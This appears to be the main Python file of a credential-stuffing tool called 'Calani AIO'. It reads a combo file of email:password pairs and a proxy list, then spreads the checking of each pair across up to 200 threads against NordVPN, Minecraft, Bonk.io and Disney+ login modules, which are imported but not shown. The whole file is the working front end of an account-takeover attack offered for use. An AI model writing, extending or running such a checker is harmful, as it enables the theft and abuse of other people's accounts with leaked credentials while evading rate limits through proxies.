from colorama import Fore,init
from multiprocessing.dummy import Pool
from time import sleep
from threading import Thread
from console.utils import set_title

red = Fore.RED
green = Fore.GREEN
cyan = Fore.CYAN
reset = Fore.RESET

class checker:
    bad = 0
    good = 0
    custom = 0
    cpm = 0
    retries = 1
    errors = 0
    timeout = 15
    threads = 200
    saving = False
    cui = True
    checking = False
    proxies = []
    accounts = []
    accounts_down = []
    proxy_type = "socks4"
    time = ""

from modules.config import *
from modules.functions import *
from modules.checkers import nordvpn
from modules.checkers import minecraft
from modules.checkers import bonk_io
from modules.checkers import disney

modules_list = {
    "nordvpn":nordvpn,
    "minecraft":minecraft,
    "bonk.io":bonk_io,
    "disney+":disney
}

def home():
    while 1:
        set_title("Calani AIO | Home | MickeyYe#0003")
        clear()
        ascii()
        print("\n\n")
        print(f"""
    [{cyan}1{reset}] Modules
    [{cyan}2{reset}] Settings
    
    [{cyan}X{reset}] Exit""")
        option = input(f"    [{cyan}>{reset}] ").lower()
        if option == "1": modules()
        elif option == "2": settings()
        elif option == "x":
            return

def modules():
    selected_modules = []
    while 1:
        set_title("Calani AIO | Modules | MickeyYe#0003")
        selected_modules = list(set(selected_modules))
        clear()
        ascii()
        print("\n\n")
        print(f"""
    [{cyan}1{reset}] Minecraft
    [{cyan}2{reset}] NordVPN
    [{cyan}3{reset}] Bonk.io
    [{cyan}4{reset}] Disney+

    [{cyan}>{reset}] Selected Modules: {str([x.title() for x in selected_modules]).replace("'","").replace("', '",", ")}
    [{cyan}A{reset}] Add All Modules
    [{cyan}S{reset}] Start Checking

    [{cyan}X{reset}] Back""")
        option = input(f"    [{cyan}>{reset}] ").lower()
        if option == "1": selected_modules.append("minecraft")
        elif option == "2": selected_modules.append("nordvpn")
        elif option == "3": selected_modules.append("bonk.io")
        elif option == "4": selected_modules.append("disney+")
        elif option == "s": 
            starter(selected_modules)
            return
        elif option == "a":
            for module in modules_list:
                selected_modules.append(module)
        elif option == "x":
            return
def settings():
    while 1:
        set_title("Calani AIO | Settings | MickeyYe#0003")
        clear()
        ascii()
        print("\n\n")
        print(f"""
    [{cyan}1{reset}] Proxy Type : {checker.proxy_type.title()}
    [{cyan}2{reset}] Proxy Timeout : {checker.timeout}s
    [{cyan}3{reset}] Print Mode : {"CUI" if checker.cui else "LOG"}
    [{cyan}4{reset}] Retries : {checker.retries}
    [{cyan}5{reset}] Threads : {checker.threads}

    [{cyan}X{reset}] Back""")
        option = input(f"    [{cyan}>{reset}] ").lower()
        if option == "1": change("proxy_type")
        elif option == "2": change("proxy_timeout")
        elif option == "3": change("print")
        elif option == "4": change("retries")
        elif option == "5": change("threads")
        elif option == "x": return


def starter(modules_lst:list):
    set_title("Calani AIO | Getting Ready | MickeyYe#0003")
    def foo(account:str):
        try:
            email = account.split(":")[0]
            password = account.split(":")[1]
        except:
            checker.bad += 1
            checker.cpm += 1
        else:
            for module in modules_lst:
                modules_list[module].check(email,password)

    clear()
    ascii()
    print("\n\n")
    print(f"    [{cyan}Pick Combo File{reset}]")
    sleep(1)
    file_path = get_file("Combo File",type="Combo File")
    if file_path == False:
        print(f"    [{cyan}No File Detected{reset}]")
        sleep(1)
        return
    with open(file_path,errors="ignore") as file: 
        before_accounts = file.read().splitlines()
        accounts = list(set(before_accounts))
        checker.accounts = accounts
        checker.accounts_down = accounts
        duplicates = len(before_accounts)-len(accounts)
    if duplicates != 0:
        print(f"    [{cyan}Removed {duplicates} Duplicates{reset}]")
        sleep(1)
    
    print("\n")
    
    print(f"    [{cyan}Pick Proxy File{reset}]")
    sleep(1)
    file_path = get_file("Proxy File File",type="Proxy File")
    if file_path == False:
        print(f"    [{cyan}No File Detected{reset}]")
        sleep(1)
        return
    with open(file_path,errors="ignore") as file: 
        contents = file.read()
        before_proxies = contents.splitlines()
        after_proxies = list(set(before_proxies))
        checker.proxies = after_proxies
        duplicates = len(before_proxies)-len(after_proxies)
    if duplicates != 0:
        print(f"    [{cyan}Removed {duplicates} Duplicates{reset}]")
        sleep(1)
    
    checker.checking = True
    checker.time = get_time()
    
    if checker.cui: Thread(target=cui,args=(len(modules_lst),),daemon=True).start()
    Thread(target=title,args=(len(modules_lst),),daemon=True).start()
    Thread(target=level_cpm,daemon=True).start()

    clear()
    print(f"    [{cyan}Starting Threads{reset}]")
    mainpool = Pool(processes=checker.threads)
    clear()
    ascii()
    mainpool.imap_unordered(func=foo,iterable=checker.accounts_down)
    mainpool.close()
    mainpool.join()
    checker.checking = False
    print("\n\n")
    print(f"    [{cyan}Finished Checking{reset}]")
    input(f"    [{cyan}Press Enter To Go Back{reset}]")

if __name__ == "__main__":
    init(autoreset=True)
    home()